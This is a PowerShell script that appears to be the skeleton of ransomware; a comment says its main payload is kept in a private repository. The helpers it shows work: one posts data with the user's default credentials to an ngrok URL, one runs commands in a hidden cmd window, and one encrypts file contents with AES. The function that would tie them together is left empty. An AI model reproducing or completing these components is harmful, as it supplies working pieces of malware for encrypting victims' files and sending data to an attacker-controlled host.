function PostToServer( $querystring ){   
	$client = New-Object System.Net.WebClient;   
	$client.Credentials = [System.Net.CredentialCache]::DefaultCredentials;   
	$client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");   
	$client.Encoding = [System.Text.Encoding]::UTF8;   
	try{     
		$response = $client.UploadString("https://598e12aaa054.ngrok.io", $querystring);     
		if( $response -eq "ok" ){ return $true; }   
	}catch{};   
	return $false;  
}; 
function execCmd( $cmd ){   
	try { 
		Start-Process -WindowStyle Hidden -FilePath "$env:comspec" -ArgumentList "/c $cmd" ; 
	}catch{}; 
}; 

function EncryptFile($fileBytes, $key, $salt, $IV ){   
	$encryptorService = new-Object System.Security.Cryptography.RijndaelManaged;      
	$keyBytes = [Text.Encoding]::UTF8.GetBytes($key);   
	$saltBytes = [Text.Encoding]::UTF8.GetBytes($salt);   
	$encryptorService.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $keyBytes, $saltBytes, "SHA1", 5).GetBytes(32);   
	$encryptorService.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($IV) )[0..15];   
	$encryptorService.Padding="Zeros";  
	$encryptorService.Mode="CBC";  
	$encryptor = $encryptorService.CreateEncryptor();   
	$memStream = new-Object IO.MemoryStream;   
	$cryptoStream = new-Object Security.Cryptography.CryptoStream $memStream, $encryptor, "Write";  
	$cryptoStream.Write($fileBytes, 0, $fileBytes.Length);  
	$cryptoStream.Close();  
	$memStream.Close();   
	$encryptorService.Clear();   
	return $memStream.ToArray(); 
}

Function Convert-HexToByteArray {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [String]
        $HexString
    )
    $bytes = [byte[]]::new($HexString.Length / 2)
    For($i=0; $i -lt $HexString.Length; $i+=2){
        $bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    return $bytes
}

function Run{
	# Malicious code here!
	# Code is in a Private repository for security sake, sorry :D
} 
Run;
